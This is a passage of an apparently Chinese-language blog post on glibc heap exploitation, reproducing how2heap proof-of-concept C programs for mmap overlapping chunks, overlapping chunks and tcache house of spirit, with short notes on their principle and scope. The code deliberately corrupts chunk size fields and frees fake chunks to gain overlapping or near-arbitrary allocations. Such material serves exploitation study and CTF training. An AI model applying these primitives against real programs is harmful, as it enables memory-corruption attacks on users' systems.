class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">技术应适用于所有版本的 GLibC</span></span><br><span class="line"><span class="comment">编译命令：`gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC 由 Maxwell Dulin（Strikeout）编写</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	关于 GLibC 中的 Mmap 块的简介</span></span><br><span class="line"><span class="comment">	==================================</span></span><br><span class="line"><span class="comment">	在 GLibC 中，存在一个点，当分配的内存块过大时，malloc 决定需要为其分配一个单独的内存区域，而不是在正常堆上分配。这是由 mmap_threshold 变量决定的。</span></span><br><span class="line"><span class="comment">	此时，使用系统调用 *Mmap* 来分配一段虚拟内存并返回给用户。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	类似地，释放过程也会有所不同。释放的块不会被返回给一个 bin 或堆的其余部分，而是使用另一个系统调用：*Munmap*。这个调用接受一个指向之前分配的 Mmap 块的指针，并将其释放回内核。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap 块在大小元数据上设置了特殊的位：第二位。如果该位被设置，则表示该块是作为 Mmap 块分配的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap 块有 prev_size 和 size。*size* 表示块的当前大小。块的 *prev_size* 表示 Mmap 块的剩余空间（不是直接下方块的大小）。</span></span><br><span class="line"><span class="comment">	然而，fd 和 bk 指针并未使用，因为 Mmap 块不会回到 bins 中，正如 GLibC Malloc 中的大多数堆块一样。释放时，块的大小必须按照页面对齐。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	下面的 POC 实际上是对 mmap 块的重叠块攻击。这与 https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c 非常相似。</span></span><br><span class="line"><span class="comment">	主要区别在于 mmapped 块具有特殊的属性，并以不同的方式处理，导致与正常重叠块攻击不同的攻击场景。</span></span><br><span class="line"><span class="comment">	还可以执行其他操作，例如 munmapping 系统库、堆本身等。</span></span><br><span class="line"><span class="comment">	这只是一个简单的概念验证，旨在演示对 mmap 块进行攻击的一般方式。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	有关 GLibC 中 mmap 块的更多信息，请阅读这篇文章：</span></span><br><span class="line"><span class="comment">	http://tukan.farm/2016/07/27/munmap-madness/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=======================================================\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCurrent System Memory Layout \n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;================================================\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;running program\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;heap\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;third mmap chunk\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;second mmap chunk\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;LibC\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;ld\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;first mmap chunk\n&quot;</span></span><br><span class="line">           <span class="string">&quot;===============================================\n\n&quot;</span> \</span><br><span class="line">    );</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This next call to free is actually just going to call munmap on the pointer we are passing it.</span></span><br><span class="line"><span class="comment">	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	With normal frees the data is still writable and readable (which creates a use after free on </span></span><br><span class="line"><span class="comment">	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span></span><br><span class="line"><span class="comment">	data is read or written to, the program crashes.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Because of this added restriction, the main goal is to get the memory back from the system</span></span><br><span class="line"><span class="comment">	to have two pointers assigned to the same location.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Would crash, if on the following:</span></span><br><span class="line"><span class="comment">	mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">	This is because the memory would not be allocated to the current program.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Allocate a very large chunk with malloc. This needs to be larger than </span></span><br><span class="line"><span class="comment">	the previously freed chunk because the mmapthreshold has increased to 0x202000.</span></span><br><span class="line"><span class="comment">	If the allocation is not larger than the size of the largest freed mmap </span></span><br><span class="line"><span class="comment">	chunk then the allocation will happen in the normal section of heap memory.</span></span><br><span class="line"><span class="comment">	*/</span>	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="type">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">	assert(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line"></span><br><span class="line">	_exit(<span class="number">0</span>); <span class="comment">// exit early just in case we corrupted some libraries</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="overlapping-chunk"><a href="#overlapping-chunk" class="headerlink" title="overlapping_chunk"></a>overlapping_chunk</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> *p1,*p2,*p3,*p4;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nThis is another simple chunks overlapping problem\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The previous technique is killed by patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;and the prev_size of it must match the unsortedbin&#x27;s size\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s start to allocate 4 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> evil_chunk_size = <span class="number">0x581</span>;</span><br><span class="line">	<span class="type">int</span> evil_region_size = <span class="number">0x580</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">		   <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>((<span class="type">char</span> *)p4, (<span class="type">char</span> *)p3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-10"><a href="#适用范围-10" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li>申请3个chunk p1,p2,p3 对应size: 0x80 0x500 0x80</li>
<li>通过溢出修改p2的size为0x581，此时p3被包含进了p2，形成了堆重叠</li>
<li>free(p2)，p3的内存会随p2一起释放掉</li>
<li>申请 0x580-0x8 大小的chunk，即p4</li>
<li>p4实质就是p2和p3合并的chunk，我们可以通过p4对p3写内容或操作</li>
</ul>
<h3 id="相关技巧-10"><a href="#相关技巧-10" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>可以通过overlapping_chunk将一个 used chunk 合并到free chunk（也可以是topchunk）中，再将它申请出来就可以实现任意地址分配</p>
<h3 id="利用效果-10"><a href="#利用效果-10" class="headerlink" title="利用效果"></a>利用效果</h3><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><p>效果：tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span 